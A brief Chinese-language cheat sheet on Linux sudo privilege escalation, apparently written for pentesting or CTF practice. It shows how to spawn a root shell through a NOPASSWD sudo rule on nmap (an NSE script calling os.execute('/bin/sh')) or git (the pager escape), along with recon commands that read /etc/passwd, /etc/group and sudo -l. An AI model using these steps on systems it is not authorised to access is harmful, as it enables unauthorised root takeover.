# sudo提权
## nmap
如果发现`(root)NOPASSWD:/usr/bin/nmap`则nmap不需要密码便可以用root权限执行,开始提权

    echo 'os.execute("/bin/sh")' > getShell.nse
    sudo -u root nmap --script=getShell.nse

## git
    sudo git -p --help

# 1. 信息搜集
1. 首先找到登录用户
```
cat /etc/passwd|grep sh
```
2. 通过/etc/group文件查看sudo组成员，也可以直接`id 用户名`查看是否是sudo组成员
```
cat /etc/group|grep sudo
```
3. 通过查看家目录隐藏文件，寻找。sudo_as_admin_seccessful文件，证实sudo成功使用
```
这里我们可以直接搜索这个文件，然后看是在哪个家目录下面即可
find / -name .sudo_as_admin_seccessful
或者一个个进入sudo组的用户家目录下面进行
ls -al
```
4. 在某些时刻被设置为NOPASSWD，可以sudo -l
```
(root)NOPASSWD:/usr/bin/nmap
```